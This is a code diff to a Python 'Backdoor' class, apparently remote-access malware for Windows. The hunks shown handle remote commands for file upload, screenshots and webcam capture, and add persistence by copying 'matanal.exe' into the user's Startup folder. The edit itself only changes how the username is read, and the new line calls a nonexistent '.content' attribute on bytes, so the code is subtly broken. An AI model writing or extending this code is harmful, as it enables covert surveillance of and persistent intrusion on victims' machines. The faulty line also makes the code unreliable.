@@ -89,7 +89,7 @@ class Backdoor:
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    username = subprocess.getoutput("echo \%username%")
+                    username = subprocess.check_output("echo \%username%", shell = True).content.decode('Windows-1251')
                     path = f"C:\\Users\\{username[1::]}\\Documents"
                     cmd = f'del "{path}\\screen.png"'
                     
@@ -99,7 +99,7 @@ class Backdoor:
                     os.system(cmd)
 
                 elif command.split()[0] == "camera":
-                    username = subprocess.getoutput("echo \%username%")
+                    username = subprocess.check_output("echo \%username%", shell = True).content.decode('Windows-1251')
                     path = f"C:\\Users\\{username[1::]}\\Documents"
                     cmd = f'del "{path}\\camera.jpg"'
                     try:
@@ -120,7 +120,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-username = subprocess.getoutput("echo \%username%")
+username = subprocess.check_output("echo \%username%", shell = True).content.decode('Windows-1251')
 path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 command = f'copy matanal.exe "{path}"'
 os.system(command)
